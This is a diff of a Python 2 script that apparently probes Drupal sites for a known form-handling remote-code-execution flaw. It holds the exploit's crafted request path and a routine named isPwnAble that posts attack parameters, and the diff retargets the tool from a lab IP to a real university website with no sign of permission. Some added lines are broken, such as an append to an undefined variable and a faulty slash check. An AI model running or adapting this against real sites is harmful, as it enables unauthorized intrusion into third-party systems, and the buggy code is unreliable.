@@ -10,6 +10,7 @@ import bb01_ultilities as ulti
 
 
 def isFormValid(host, version):
+    if(host[:-1] != '/'): form+= '/'
     form_id = 'user/password' if version[:1] == '7' else 'user/register'
     urlq = host + '?q=' + form_id
     url = host + form_id
@@ -46,7 +47,8 @@ def isPwnAble(host, version):
         try:
             r = requests.post(host, data=post_params,
                               params=get_params, verify=False)
-        except:
+        except Exception as e:
+            print e
             return False
         m = re.search(r'<input type="hidden" name="form_build_id"'
                       ' value="([^"]+)"', r.text)
@@ -83,29 +85,38 @@ def isVuln(host, version):
     if isFormValid(host, version) is False:
         return False
 
-    if isPwnAble(host, version) is False:
-        return False
+    # if isPwnAble(host, version) is False:
+    #     return False
 
     return True
 
 
 host = 'http://83.240.184.26/drupal/'
-host = 'http://192.168.210.134'
+host = 'https://www.lincoln.edu/?q=user/password'
 # hos = 'http://zestman.com/'
 version = '7.44'
 # ver = '8.2'
 print 'Testing: ', host
 print '=' * 25
+
+if(host[:-1] != '/'): host+= '/'
+print host
+
+# try:
+#     r = requests.get(host, verify=False)
+# except Exception as e:
+#     print e
+# print r
+    
+# print isFormValid('https://www.lincoln.edu/',version)
 # ulti.isURLRedirected(host+'user/password')
 # ulti.isURLRedirected('http://192.168.210.134/?q=user/password')
 # print isPwnAbleRedirect('x','7')
 # print isPwnAble(host, version)
-try:
-    host = ''.join([host, 'user/register?element_parents=account/mail/%23',
-                'value&ajax_form=1&_wrapper_format=drupal_ajax'])
-    if isVuln(host, version):
-        print " This site is vulnerable"
-    else:
-        print " This site is invulnerable"
-except:
-    pass
+# try:
+#     if isVuln(host, version):
+#         print " This site is vulnerable"
+#     else:
+#         print " This site is invulnerable"
+# except:
+#     pass
